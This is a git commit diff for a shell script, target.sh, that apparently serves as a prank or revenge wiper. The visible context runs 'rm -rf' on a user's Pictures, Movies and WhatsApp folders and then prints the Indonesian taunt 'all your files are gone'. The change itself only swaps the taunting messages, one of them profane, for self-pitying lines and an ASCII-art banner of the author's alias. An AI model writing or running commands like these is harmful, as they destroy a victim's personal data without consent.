9620e298f869ee81ed9764f040206fbbf233703d
AsepAMF <65014192+AsepAMF@users.noreply.github.com>
2020-07-01 21:18:35 +0700

    Update target.sh

--- target.sh
+++ target.sh
@@ -9,6 +9,17 @@ rm -rf Pictures
 rm -rf Movies
 rm -rf WhatsApp
 echo "Mampus Semua File Lu Hilang"
-echo "Roni Tersakiti Ya Jadi Gini"
-echo "Mangkanya Jangan Macam Macam"
-echo "Fuck You !!"
+echo "Maulana Ros Amf alias AsepAMF Sedang Galau Ya Jadi Gini"
+echo "Dia Sedang Sedih Karena Perjuangan Nya Gak Di Anggap"
+
+                   
+                MAULANA ROS AMF
+
+                    ALIAS
+
+
+   / \   ___  ___ _ __   / \  |  \/  |  ___|
+  / _ \ / __|/ _ \ '_ \ / _ \ | |\/| | |_
+ / ___ \\__ \  __/ |_) / ___ \| |  | |  _|
+/_/   \_\___/\___| .__/_/   \_\_|  |_|_|
+                 |_
